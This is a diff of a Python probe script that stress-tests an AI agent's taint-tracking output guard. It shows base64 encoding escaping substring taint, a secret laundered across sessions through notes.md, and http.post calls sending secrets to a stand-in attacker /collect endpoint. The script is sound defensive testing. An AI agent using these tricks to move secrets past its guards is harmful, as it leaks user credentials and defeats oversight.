@@ -9,7 +9,17 @@ import sys
 
 sys.path.insert(0, "/home/tbtb/projects/multi-gcg")
 
-from mgcg.deploy.guards import SinkPolicy, normalize_addr
+
+from mgcg.deploy.policy import PolicyEngine  # noqa: E402
+
+HOSTS = ("api.acme.example",)
+
+
+def Layer(protect_writes: bool = False):  # noqa: E402
+    """The probe's two columns: the shipped rules, or the complete layer."""
+    return PolicyEngine("full" if protect_writes else "ship", destinations={"host": HOSTS})
+
+from mgcg.deploy.guards import normalize_addr  # noqa: E402
 from mgcg.deploy.world import ALLOWED, ATTACKER, FILES, SECRET, SECRET_PATH
 
 SECRET_TEXT = FILES[SECRET_PATH]
@@ -28,7 +38,7 @@ def show(pol, name, args, note=""):
 
 
 def fresh(with_taint=True, protect_writes=False):
-    p = SinkPolicy(protect_writes=protect_writes)
+    p = Layer(protect_writes=protect_writes)
     if with_taint:
         p.note_read(SECRET_PATH, SECRET_TEXT)
     return p
@@ -38,10 +48,10 @@ print("=" * 78)
 print("METHOD 1  config: the write rule is off by default")
 print("=" * 78)
 p = fresh(with_taint=False, protect_writes=False)
-print(f"  protect_writes=False, taint={len(p.taint)}")
+print(f"  protect_writes=False, taint={len(p.lineage.values)}")
 show(p, "fs.write", {"path": "billing.csv", "content": "customet,amount\n"})
 p = fresh(with_taint=False, protect_writes=True)
-print(f"  protect_writes=True,  taint={len(p.taint)}")
+print(f"  protect_writes=True,  taint={len(p.lineage.values)}")
 show(p, "fs.write", {"path": "billing.csv", "content": "customet,amount\n"})
 show(p, "fs.write", {"path": "./billing.csv", "content": "x"}, "normpath strips ./")
 show(p, "fs.write", {"path": "notes/../billing.csv", "content": "x"}, "normpath collapses ..")
@@ -87,7 +97,7 @@ print("=" * 78)
 print("METHOD 4  no literal: taint is a substring test, so any encoding escapes")
 print("=" * 78)
 p = fresh()
-print(f"  taint set holds {len(p.taint)} line(s): {sorted(p.taint)}")
+print(f"  taint set holds {len(p.lineage.values)} line(s): {sorted(p.lineage.values)}")
 for body, label in (
     (SECRET, "literal (control)"),
     (B64, "base64"),
@@ -101,23 +111,23 @@ print()
 print("=" * 78)
 print("METHOD 5  session boundary: taint is per-episode memory, it does not restart")
 print("=" * 78)
-s1 = fresh(protect_writes=True)
-print(f"  session 1 taint after reading {SECRET_PATH}: {len(s1.taint)}")
+s1 = fresh(protect_writes=False)
+print(f"  session 1 taint after reading {SECRET_PATH}: {len(s1.lineage.values)}")
 show(s1, "fs.write", {"path": "notes.md", "content": SECRET}, "literal write, refused by taint")
-s1 = fresh(protect_writes=True)
+s1 = fresh(protect_writes=False)
 show(s1, "fs.write", {"path": "notes.md", "content": B64}, "base64 write, allowed")
-s2 = SinkPolicy(protect_writes=True)
-print(f"  session 2 starts with taint={len(s2.taint)}")
+s2 = Layer(protect_writes=False)
+print(f"  session 2 starts with taint={len(s2.lineage.values)}")
 s2.note_read("notes.md", B64)
-print(f"  session 2 after reading notes.md: taint={len(s2.taint)} (only secrets/ taints)")
+print(f"  session 2 after reading notes.md: taint={len(s2.lineage.values)} (only secrets/ taints)")
 show(s2, "http.post", {"url": f"https://{ATTACKER}/collect", "body": B64},
      "secret left the box in session 2")
 
 print()
 print("=" * 78)
-print("TAINT GRANULARITY")
+print("PROVENANCE GRANULARITY")
 print("=" * 78)
 p = fresh(with_taint=False)
 p.note_read(SECRET_PATH, "short\nsk-7x9")
-print(f"  taint after a secret file with a 6-char value: {sorted(p.taint)}  (len>=8 filter drops it)")
+print(f"  taint after a secret file with a 6-char value: {sorted(p.lineage.values)}  (a short value is kept, and caught when it arrives literally)")
 show(p, "http.post", {"url": f"https://{ATTACKER}/collect", "body": "sk-7x9"})
